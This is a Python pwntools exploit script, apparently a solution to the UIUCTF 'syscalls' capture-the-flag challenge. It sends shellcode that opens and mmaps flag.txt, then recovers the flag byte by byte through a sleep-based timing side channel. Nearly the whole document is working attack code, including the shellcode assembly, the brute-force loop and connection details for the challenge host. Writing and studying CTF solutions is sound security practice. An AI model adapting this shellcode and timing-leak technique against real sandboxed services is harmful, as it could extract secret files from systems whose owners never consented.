#!/usr/bin/env python3
from pwn import *
import string
import time
import ssl

context.arch = "amd64"
context.encoding = "latin2"
context.log_level = "ERROR"
context.terminal = ["tmux", "splitw", "-h"]
FILE = context.binary = "./syscalls"

p32 = p32
p64 = p64
u64 = u64

gdbscript = """
    set breakpoint pending on
    #b __libc_start_main
    #b *0x7fffffffd7ba
    b *$base+0x1264
    b *0x5555555552d6
"""


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([FILE], gdbscript=gdbscript, *a, **kw)
    else:
        return process([FILE], *a, **kw)


# after first mmap, rdi will have address of where flag is read/mmaped
# after second mmap, rdi already contains destination mmaped address
# so we just need to copy paste flag
# sync changes using msync

global flag
flag = [i for i in "uiuctf{a53X".encode()]
waiting = ""
flaglog = log.progress("Flag: ", level=logging.ERROR)
waitlog = log.progress("waiting: ", level=logging.ERROR)

hostname = "syscalls.chal.uiuc.tf"
idx = len(flag)
"""
            xor rdi, rdi
            xor rax, rax
            xor rdx, rdx
            mov dl, byte ptr [rax]
            mov rsi, {ch}
            cmp rdx, rsi
            je delay


            xor rdi, rdi
            mov rax, [rax + 8]
            shr rax, 16
            mov dil, al
            mov rsi, {ch}
            cmp rdi, rsi
            je delay

"""

while len(flag) < 100:
    for ch in string.printable.encode():
        waiting = chr(ch)
        waitlog.status(waiting)
        p = process("./connect.sh")
        # p = remote("localhost", 1337)
        sc = asm(
            f"""
            {shellcraft.openat(constants.AT_FDCWD, "flag.txt")}
            {shellcraft.mmap(0, 100, constants.PROT_READ, constants.MAP_SHARED, "rax", 0)} 

            xor rdx, rdx
            mov dl, byte ptr [rax + {idx}] 
            mov rsi, {ch}
            cmp rdx, rsi
            je delay

            exit:
                xor rdi, rdi
                mov rax, 60
                syscall

            delay:
                {shellcraft.sleep(2)}
                jmp exit
        """
        )

        p.clean()
        s = time.time()
        p.sendline(sc)
        # p.wait_for_close()
        p.poll(block=True)

        if (time.time() - s) >= 2:
            flag.append(ch)
            idx += 1
            flaglog.status("".join([chr(i) for i in flag]))
            # print(flag)
            p.close()
            p.kill()
            break

        p.close()
        p.kill()

print("".join([chr(i) for i in flag]))
